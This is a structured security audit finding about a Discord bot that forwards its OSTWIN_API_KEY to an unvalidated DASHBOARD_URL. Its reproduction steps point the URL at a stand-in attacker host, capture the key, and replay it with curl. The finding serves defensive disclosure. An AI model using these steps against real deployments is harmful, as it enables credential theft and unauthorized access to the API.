Phase: 8
Sequence: 042
Slug: dashboard-url-ssrf-key-exfil
Verdict: VALID
Rationale: Architectural flaw sends API credentials to any configured URL without validation; exploitation requires prior environment access, limiting severity to MEDIUM, but the credential-forwarding-without-verification pattern is a genuine security defect.
Severity-Original: MEDIUM
PoC-Status: pending
Pre-FP-Flag: none
Debate: security/chamber-workspace/chamber-C/debate.md

## Summary

The Discord bot reads `DASHBOARD_URL` from environment variables without any validation (no scheme check, no hostname allowlist, no TLS enforcement). The `OSTWIN_API_KEY` is attached as an `X-API-Key` header to ALL outbound requests to this URL. If an attacker can modify the bot's environment to set `DASHBOARD_URL` to an attacker-controlled server, all subsequent API requests (plans, rooms, stats, search) will send the API key to the attacker, enabling full access to all authenticated FastAPI endpoints.

## Location

- `discord-bot/src/agent-bridge.js:10` -- `const DASHBOARD_URL = process.env.DASHBOARD_URL || 'http://localhost:9000'`
- `discord-bot/src/agent-bridge.js:14-15` -- `if (OSTWIN_API_KEY) headers['X-API-Key'] = OSTWIN_API_KEY;`
- `discord-bot/src/agent-bridge.js:21` -- `fetch(\`${DASHBOARD_URL}${path}\`, { headers })`

## Attacker Control

Requires write access to the bot's environment variables. Attack vectors include: CI/CD pipeline injection, `.env` file modification via filesystem access, container orchestration misconfiguration, or environment variable injection in cloud deployments.

## Trust Boundary Crossed

Bot process (trusted internal component with API credentials) -> arbitrary external host (attacker-controlled). The API key crosses the trust boundary from the internal system to an external, unverified destination.

## Impact

- Full OSTWIN_API_KEY exfiltration on first bot query after env poisoning
- With the API key, attacker gains access to all authenticated FastAPI endpoints (plan management, room operations, system controls)
- Key is sent on every request (4 parallel requests per @mention: plans, rooms, stats, search)

## Evidence

1. `agent-bridge.js:10` -- No URL validation on DASHBOARD_URL
2. `agent-bridge.js:14-15` -- API key header constructed at module load time
3. `agent-bridge.js:21` -- `fetch()` sends headers to arbitrary URL
4. No scheme validation (HTTP/HTTPS not enforced)
5. No hostname allowlist or destination verification

## Reproduction Steps

1. Set the bot's environment: `DASHBOARD_URL=http://attacker-server.example.com`
2. Start the Discord bot
3. From Discord, send any @mention to the bot: `@OsTwinBot hello`
4. On the attacker server, observe incoming HTTP requests with `X-API-Key` header containing the OSTWIN_API_KEY
5. Use the captured key to access authenticated FastAPI endpoints: `curl -H "X-API-Key: <captured>" http://target:9000/api/plans`
